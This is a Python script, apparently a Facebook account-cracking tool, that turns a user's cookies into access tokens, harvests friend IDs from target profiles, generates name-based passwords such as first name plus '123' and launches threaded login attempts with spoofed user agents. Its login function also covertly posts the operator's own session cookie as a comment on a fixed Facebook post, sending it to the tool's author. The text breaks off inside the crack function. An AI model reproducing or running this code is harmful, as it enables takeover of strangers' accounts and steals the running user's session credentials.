# encoding: utf-8
# Decode by Plya_Team-Pro tool...
# Copyright: Plya_Team
# Follow us on telegram ( @Plya_Team ) 
# Layers --> code 1
# encryption --> [ Github - Obf ] 
import requests,bs4,json,os,sys,random,datetime,time,re

import urllib3,rich,base64

from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import requests, webbrowser
from time import sleep as abat
#جماعه الفك لا تصيرون حمير مجرد التوكن للاشتراك الاجباري ودليل ما ضايف مود توصيل تحت داله الصيد 
#now = datetime.datetime.today()
#now = datetime.datetime.today()
#mm = str(now.month)
#dd = str(now.day)
#yyyy = str(now.year)
#hour = str(now.hour)
#mi = str(now.minute)
#ss = str(now.second)
#t = mm + '/' + dd + '/' + yyyy + ' ' + hour + ':' + mi + ':' + ss
#hours = now.hour
#x = datetime.datetime.now()
#g = datetime.datetime(2024, 5, 27, 7, 10, 9)
#if (x.strftime("%x"))>(g.strftime("%x")):
# print('\n\n')
# print("     "+'خلص التفعيل راسلني افعلك ')
# print('\n\n')
 
# sys.exit(0)
 

#if (x.strftime("%x"))==(g.strftime("%x")):
 #  print('')
#   if(x.strftime("%X"))>(g.strftime("%X")):
#    print('\n\n')
#    print("     "+'خلص التفعيل راسلني افعلك ')
#    print('\n\n')
    
#    sys.exit(0)
#   else:
#    print('')  
#else:
#    print('')
#print('')
#os.system('clear')
#tok = 'توكن' 
#ch = '' 
#id = int(input(' ايدي حسابك  : '))
#ww = requests.get(f'https://api.telegram.org/bot{tok}/getChatMember?chat_id=@{ch}&user_id={id}').#json()
#if ww['ok'] == False:
# print(f'يجب الاشتراك في القناه اولاً  : @{ch}')
# abat(1)
# webbrowser.open(f'https://t.me/{ch}')
# exit()
#else:
# pass
pretty.install()
CON=sol()
#--------------------[ BAGIAN-MASUK ]--------------#
def DYNO():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			MRDYNO()
		except requests.exceptions.ConnectionError:
			li = '# Problem Internet Connection, Check And Try Again'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		MRDYNO()
def error():
	print(f'\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mMaaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
def MRDYNO():
	try:
		os.system('clear')
		banner()
		your_cookies = input(' Cookie :  ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://0.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': '0.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://0.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://0.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://0.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://0.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://0.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://0.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n ╰─  Token : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print("\n LOGIN ¢ PRO.py");exit()
			except Exception as e:
				print(" ╰─  Cookies Mokad Kontol")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
	        
 #------------------[ JNOKA ]-------------------#
import os, platform, time, sys
print('\033[97;1m[\033[92;1m𝙍𝙖𝙮𝙚𝙣-𝙂𝙖𝙢𝙤𝙪𝙙𝙞\033[97;1m] \033[0;96mWaiting Login.. ')
time.sleep(5)
os.system('clear')
time.sleep(2)

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
prinCP=[]
try:
    prox= requests.get('https://github.com/MR-ALONE786/File-Cloning/blob/main/Approved.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
    prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='SamsungBrowser'
    e=random.randrange(100, 9999)
    f='NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 12'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,115)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xd in range(1000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for ua in range(10000):
    a='Mozilla/5.0 (Symbian/55; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaX7-00'
    e=random.randrange(100, 9999)
    f='/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/533.4'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    aa='Mozilla/5.0 (Linux; Android 8.1.0)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' GT-S5830L'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for ua in range(1000):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5380D'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile HVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
    
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
 
 

#------------[ JNOKA ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#------------------[ MACHINE-SUPPORT ]---------------#
 
def JNOKA(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
    
#------------------[ LOGO-HAMA ]-----------------#
logo ="""\033[1;91m

_______________
< 𝙍𝙖𝙮𝙚𝙣-𝙂𝙖𝙢𝙤𝙪𝙙𝙞 >
 ---------------
  _____                           _____                                 _ _
 |  __ \                         / ____|                               | (_)
 | |__) |__ _ _   _  ___ _ __   | |  __  __ _ _ __ ___   ___  _   _  __| |_
 |  _  // _` | | | |/ _ \ '_ \  | | |_ |/ _` | '_ ` _ \ / _ \| | | |/ _` | |
 | | \ \ (_| | |_| |  __/ | | | | |__| | (_| | | | | | | (_) | |_| | (_| | |
 |_|  \_\__,_|\__, |\___|_| |_|  \_____|\__,_|_| |_| |_|\___/ \__,_|\__,_|_|
               __/ |
              |___/                                   
"""
os.system('clear')
print(logo)
print(50*'\033[1;37m-')
pass
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            
            animation('No Internet')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        os.system('clear')
        print(logo)
        ses = requests.Session()
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        tokenw = open(".token.txt", "w").write(tok)
        cokiew = open(".cok.txt", "w").write(cookie)
      #exit()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        os.system("python nono.py")
        exit()
        

#------------------[ MENU ]----------------#
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print('\033[0;92m=============================')
    print('» 1- Crack from File : 🆔 ')
    print('\033[1;33m ~~~~~~~~~~~~~~~~~~~~~~~')
    print('» 2- crack from friends : 👤 ')
    print('\033[1;33m ~~~~~~~~~~~~~~~~~~~~~~~')
    print('» 3- TEST : 🌐 ')
    print('')
    JNOKA  = input('\033[1;91m{💠}- CHOOSE :  ')

    if JNOKA in ['1']:
        JNOKA_FILE()
    elif JNOKA in ['2']:
        dump_massal()
    elif JNOKA in ['3']:
        login()
    elif JNOKA in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')        
        animation(' DONE ')
        exit()
    else:

        animation('  ')
        back()
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		kumpulkan = int(input(f'\033[1;37mLimit of ID you take : \033[1;32m'))
	except ValueError:
		exit()
	if kumpulkan<1 or kumpulkan>1000:
		exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'\033[1;37mPASTE ID : '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
		try:
			head = (
			{"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
			})
			if len(id) == 0:
				params = (
				{
				'access_token': token,
				'fields': "friends"
				}	          
			)
			else:
				params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
			url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
			for xr in url['friends']['data']:
				try:
					woy = (xr['id']+'|'+xr['name'])
					if woy in id:pass
					else:id.append(woy)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			exit()
	try:
			print(f'TOTAL ID CLOCTED : {h}'+str(len(id)))
			setting()
	except requests.exceptions.ConnectionError:
		exit()
	except (KeyError,IOError):
		exit()
def login():
        clear()
        cookies = input('  cookies: ')
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(EAAG\w+)", data.text)
                open(".tok.txt", "w").write(find_token.group(1))
                open(".coki.txt","w").write(cookies)
                tok=open('.tok.txt','r').read()
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cookies}).json()
                name=(info['name'])
                idd=(info['id'])
                barth=(info['birthday'])
                linex()
                print(' name\033[1;32m : '+name)
                print(' \033[1;37m ID : '+idd)
                print(' Barth Day: '+barth)
                requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                linex()
                print(' ✅✅✅✅✅..')
                time.sleep(10)
                
        except KeyError:
              
                login()
#-------------[ CRACK-FROM-FILE ]------------------#
 
def JNOKA_FILE():
    o = input('\033[1;37m\033[1;37mNAME FILE\033[1;37m :\033[1;37m ')
    try:lin = open(o).read().splitlines()
    except:
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
def tahun(fx):
        if len(fx)==15:
                if fx[:10] in ['1000000000']       :tahunz = '2009'
                elif fx[:9] in ['100000000']       :tahunz = '2009'
                elif fx[:8] in ['10000000']        :tahunz = '2009'
                elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
                elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
                elif fx[:6] in ['100001']          :tahunz = '2010-2011'
                elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
                elif fx[:6] in ['100004']          :tahunz = '2012-2013'
                elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
                elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
                elif fx[:6] in ['100009']          :tahunz = '2015'
                elif fx[:5] in ['10001']           :tahunz = '2015-2016'
                elif fx[:5] in ['10002']           :tahunz = '2016-2017'
                elif fx[:5] in ['10003']           :tahunz = '2018'
                elif fx[:5] in ['10004']           :tahunz = '2019'
                elif fx[:5] in ['10005']           :tahunz = '2020'
                elif fx[:5] in ['10006','10007','10008','10009','100010','100011','100012']:tahunz = '2021-2022'
                else:tahunz=''
        elif len(fx) in [9,10]:
                tahunz = '2008-2009'
        elif len(fx)==8:
                tahunz = '2007-2008'
        elif len(fx)==7:
                tahunz = '2006-2007'
        else:tahunz=''
        return tahunz		
def setting():
    print('\x1b[97;1m\x1b[1;93m[\x1b[1;91m1\x1b[1;93m] \x1b[1;92mMETHOD SUPORT OLD ID \n\x1b[1;93m[\x1b[1;91m2\x1b[1;93m] \x1b[1;92mMETHOD SUPORT NEW IDS \n\x1b[1;93m[\x1b[1;91m3\033[1;37m \033[1;37mMETHOD SUPORT ALL IDS')
    hu = input('\033[97;1m\033[92;1m\033[97;1mCHOOSE :\033[1;37m ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['02','2']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print('\x1b[97;1m\x1b[1;93m[\x1b[1;91m1\x1b[1;93m] \x1b[1;92mMETHOD SUPORT ALL INTARNET')
    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
#-------------------[ BAGIAN-WORDLIST ]------------#
def cek_DYNO(kuki):
	session = requests.Session()
	w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

 
def passwrd():
    clear()
    print(M + logo)
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf = yuzong.split('|')[0]
            nmf = yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(frs + '123')
                    pwv.append(frs + frs)
                    pwv.append(frs + '1234')
                    pwv.append(frs + '12345')
                    pwv.append(frs + '123456')
                    pwv.append(frs + '12')
                    pwv.append(nmf)
                    pwv.append(frs + '1234567')
            elif len(frs) < 3:
                pwv.append(nmf)
            else:
                pwv.append(frs + '123')
                pwv.append(frs + '12')
                pwv.append(frs + frs)
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '123456')
                pwv.append(nmf)
                pwv.append(frs + '1234567')
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
import os
import requests
import random
import time
import json
import re
import mechanize
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.panel import Panel
import sys

init(autoreset=True)
console = Console()

cp_count = 0
ok_count = 0
session = requests.Session()
import time
from rich.console import Console

console = Console()

import time
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor, as_completed

console = Console()
# استخراج jazoest و lsd مرة واحدة فقطvv
def get_fb_tokens():
    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.set_cookiejar(mechanize.CookieJar())
    
    br.addheaders = [
        ('User-Agent', f'Mozilla/5.0 (Linux; Android {random.choice(["9", "10", "11", "12", "13", "14"])}; Mobile Safari/537.36'),
        ('Accept', "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"),
        ('accept-language', "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7")
    ]

    response = br.open("https://free.prod.facebook.com")
    html = response.read().decode("utf-8")

    jas = re.search(r'"jazoest",\s*"(\d+)"', html)
    Lsd = re.search(r'"lsd":"(.*?)"', html)

    jas = jas.group(1) if jas else None
    Lsd = Lsd.group(1) if Lsd else None

    cookies = {cookie.name: cookie.value for cookie in br.cookiejar}
    return jas, Lsd, cookies

# جلب القيم لمرة واحدة فقط
jazoest, lsd, fb_cookies = get_fb_tokens()
def crack(idf, pwv):
	global loop, ok, cp
	bo = random.choice([m, k, h, b, u, x])
